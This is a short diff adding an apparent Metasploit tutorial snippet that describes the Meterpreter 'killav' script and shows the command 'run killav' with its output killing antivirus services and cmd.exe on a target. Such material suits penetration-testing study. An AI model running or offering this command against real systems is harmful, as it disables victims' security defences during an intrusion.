@@ -1,0 +1,6 @@
+The killav script can be used to disable most antivirus programs running as a service on a target.
+
+meterpreter > run killav
+
+[*] Killing Antivirus services on the target...
+[*] Killing off cmd.exe...
